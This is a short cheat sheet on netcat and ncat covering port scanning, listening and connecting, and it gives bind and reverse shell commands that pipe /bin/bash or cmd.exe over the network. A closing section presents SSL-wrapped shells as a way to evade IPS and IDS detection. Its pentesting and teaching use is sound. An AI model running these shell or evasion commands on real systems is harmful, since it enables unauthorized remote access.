Netcat, known as the "Swiss Army knife of networking," is a versatile command-line tool for reading and writing over network connections. It can be used for port scanning, file transfer, and even as a backdoor. Netcat allows you to establish TCP or UDP connections as both a client and a server, providing flexibility for a variety of applications, such as debugging network services and testing connectivity. It supports multiple protocols, including TCP, UDP, and Unix domain sockets, and can handle both IPv4 and IPv6 connections. It offers options for controlling data flow, setting timeouts, and handling data packets, providing users with precise control over their network interactions.

## How to Interact with a server
`nc host port`

Example: `nc -v www.host.com 21`
Example: `nc -v www.host.com 80`

## Opening a port and connecting
`nc command port`

### Opening a port
Example Windows: `nc.exe -vlp port`

Example Linux: `nc -vlp port`

### Connecting to a port
Example Windows: `nc.exe ip port`

Example Linux: `nc -v ip port`

## Port Scanning
`nc -vnz host port`

Example: `nc -vnz 192.168.0.1 1-1024`

## Bind Shell x Reverse Shell
### Bind Shell
In the Bind Shell, the attacker connects directly to the target's port


Example Linux opening the shell: `nc -vnlp port -e /bin/bash`

Example Windows to connect: `nc.exe -vn host port`


Example Windows opening the shell: `nc.exe -vnlp port -e cmd.exe`

Example Linux  to connect: `nc -vn host port`

### Reverse Shell
In the Reverse shell, the target connects and sends the shell to the attacker


Example Linux opening the port: `nc -vnlp port`

Example  Windows sending the shell: `nc.exe -vn host port -e cmd.exe`


Example Windows opening the port: `nc.exe -vnlp port`

Example Linux sending the shell: `nc -vn host port -e /bin/bash`

## Netcat x Ncat
Netcat has the ability to encrypt the data being passed through the shell, which makes it difficult for an IPS or an IDS to detect any threats


How to create the SSL key: `openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10`

How to make the communication: `ncat -vnlp <port> --ssl-key chave.pem --ssl-cert cert.pem`

How to connct: `ncat -vn <host> <port> --ssl`